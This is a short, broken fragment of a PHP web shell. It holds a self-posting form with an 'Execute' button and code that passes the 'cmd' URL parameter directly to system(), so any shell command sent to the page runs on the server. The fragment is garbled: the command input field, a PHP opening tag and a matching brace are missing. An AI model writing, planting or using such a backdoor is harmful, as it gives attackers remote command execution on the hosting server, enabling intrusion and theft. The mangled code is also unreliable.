<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">

<input type="SUBMIT" value="Execute">
</form>
<pre>

if(isset($_GET['cmd']))

system($_GET['cmd'] . ' 2>&1');
}
